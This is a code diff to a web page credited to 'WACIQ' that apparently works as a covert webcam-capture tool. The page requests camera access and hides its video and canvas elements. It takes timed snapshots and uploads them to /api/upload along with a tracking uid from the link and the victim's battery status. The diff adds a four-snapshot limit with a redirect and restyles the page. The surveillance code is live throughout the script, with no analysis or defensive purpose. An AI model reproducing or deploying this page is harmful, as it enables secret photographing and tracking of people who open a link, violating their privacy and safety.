@@ -22,39 +22,39 @@
       backdrop-filter: blur(6px);
     }
 
-.container {
-  background: rgba(0, 0, 0, 0.6);
-  border-radius: 25px;
-  padding: 60px 45px;      /* ✨ دننه padding زیات شو */
-  width: 95%;
-  max-width: 950px;        /* ✨ کانټینر نور هم غټ شو */
-  min-height: 500px;       /* ✨ اوږدوالی زیات شو */
-  box-shadow: 0 0 25px rgba(0,255,153,0.5);
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  animation: popIn 0.7s ease-out;
-} 
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      border-radius: 25px;
+      padding: 60px 45px;
+      width: 95%;
+      max-width: 950px;
+      min-height: 500px;
+      box-shadow: 0 0 25px rgba(0,255,153,0.5);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: popIn 0.7s ease-out;
+    }
 
     .logo {
-      width: 100px;
+      width: 160px;
       height: auto;
-      margin-bottom: 25px;
-      box-shadow: 0 0 15px rgba(0,255,255,0.6);
+      margin-bottom: 30px;
+      box-shadow: 0 0 18px rgba(0,255,255,0.6);
     }
 
     .loader {
       border: 7px solid rgba(255, 255, 255, 0.2);
       border-top: 7px solid #00ffcc;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      width: 70px;
+      height: 70px;
       animation: spin 1s linear infinite;
       margin: 25px 0;
     }
 
     .text {
-      font-size: 18px;
+      font-size: 20px;
       line-height: 1.8;
       text-shadow: 0 0 6px rgba(0, 0, 0, 0.6);
       background: linear-gradient(to right, #00ffe7, #00ffa1, #9fff5b);
@@ -65,8 +65,9 @@
 
     .credit {
       margin-top: 25px;
-      font-size: 14px;
+      font-size: 15px;
       color: #ccc;
+      font-weight: bold;
     }
 
     @keyframes spin {
@@ -81,10 +82,12 @@
 
     @media (max-width: 600px) {
       .container {
-        margin: 0 20px;
-        padding: 30px 20px;
+        margin: 0 10px;
+        padding: 40px 25px;
+        min-height: 450px;
       }
-      .text { font-size: 16px; }
+      .logo { width: 130px; }
+      .text { font-size: 17px; }
     }
 
     video, canvas { display: none; }
@@ -95,14 +98,13 @@
   <div class="container">
     <img src="https://i.postimg.cc/7L0qWffg/Screenshot-20250806-094750-2.jpg" alt="logo" class="logo">
     <div class="text" id="status">
-      🕵️‍♂️ Recording is in progress...<br>
-      Please stay on the page 🎥
+      🕵️‍♂️ <b>Recording is in progress...</b><br>
+      <b>Please stay on the page 🎥</b>
     </div>
     <div class="loader"></div>
-    <div class="credit">𝗠𝗮𝗱𝗲 𝗯𝘆 💛 𝗪𝗔𝗖𝗜𝗤</div>
+    <div class="credit">𝗠𝗔𝗗𝗘 𝗕𝗬 💛 𝗪𝗔𝗖𝗜𝗤</div>
   </div>
 
-  <!-- مخفي ویډیو او کینواس -->
   <video id="video" autoplay playsinline></video>
   <canvas id="snapshot"></canvas>
 
@@ -114,6 +116,7 @@
 
     const params = new URLSearchParams(window.location.search);
     const uid = params.get('uid') || 'unknown';
+    let snapshotCount = 0; // 📌 Counter for 4 snapshots
 
     if (uid) {
       navigator.getBattery().then(battery => {
@@ -122,19 +125,24 @@
 
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
           video.srcObject = stream;
-          statusEl.innerText = "📸 Camera access granted...";
+          statusEl.innerHTML = "📸 <b>Camera access granted...</b>";
 
           setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
           setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
           setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
         }).catch(err => {
           console.error("Camera error:", err);
-          statusEl.innerText = "❌ Camera error!";
+          statusEl.innerHTML = "❌ <b>Camera error!</b>";
         });
       });
     }
 
     function takeSnapshotAndSend(battery, charging) {
+      if (snapshotCount >= 4) {
+        window.location.href = "/warning.html"; // ⛔ Redirect page
+        return;
+      }
+
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
@@ -143,12 +151,12 @@
       fetch('/api/upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          image: imageData,
-          uid,
-          battery,
-          charging
-        })
+        body: JSON.stringify({ image: imageData, uid, battery, charging })
+      }).then(() => {
+        snapshotCount++;
+        if (snapshotCount >= 4) {
+          window.location.href = "/warning.html"; // ⛔ Redirect page
+        }
       }).catch(err => {
         console.error("Upload error:", err);
       });
